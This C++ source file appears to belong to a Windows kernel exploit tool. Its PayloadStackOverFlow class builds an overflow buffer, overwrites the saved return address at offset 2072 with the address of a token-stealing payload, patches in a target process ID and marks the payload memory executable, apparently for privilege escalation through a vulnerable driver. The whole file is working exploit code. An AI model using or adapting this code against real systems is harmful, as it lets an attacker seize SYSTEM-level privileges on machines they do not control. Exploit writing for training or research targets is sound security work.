
#include "payload_stack_overflow.h"

namespace payload_stack_overflow {
	
	bool PayloadStackOverFlow :: init() {
		auto b_res = false;
		if (payloads :: process_is_running(_targetPid)) {
			// 1 Allocate buffer, 
			// 2 fill buffer with 0x49 value
			// 3 set RIP offset as a address of payload 
			// 4 grant EXECUTE permission to allow payload to be executed
			if (NULL != (_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, _bufferSz)) ) {
				memset(_buffer, /*0x49*/ (int)'I', _bufferSz);

				const auto rip_offset = 2072; // = RIP - register				// [Option] we can also control RSP register
				ULONG* payload_addr = (ULONG*)(_buffer + rip_offset);			//const DWORD rip_offset = 2080; // = RSP - register
				*(__int64*)payload_addr = 
					(__int64)&TokenStealingPayloadStackOverflow;	//memset(input_buffer + 2080, 0x42, 8);

				if (payloads::set_pid_to_payload(_targetPid, 
					TokenStealingPayloadStackOverflow) &&
					payloads::set_memory_permission(PAGE_EXECUTE_READ)) {
					b_res = true;
				}
			}
		}
		else {
			cout << "There is no active process with the UniqueProcessId = " << _targetPid << endl;
		}
		return b_res;
	}

	void PayloadStackOverFlow :: clear() {
		// Restore permissions and free memory
		if (_buffer) {
			if (payloads :: set_memory_permission(PAGE_READWRITE)) {
				
				// Restore default 'PID' value in the payload
				payloads :: set_pid_to_payload(payloads::g_dwDefaultPid, 
					TokenStealingPayloadStackOverflow);

				HeapFree(GetProcessHeap(), 0, _buffer);
			}
		}
	}

	

	

	
}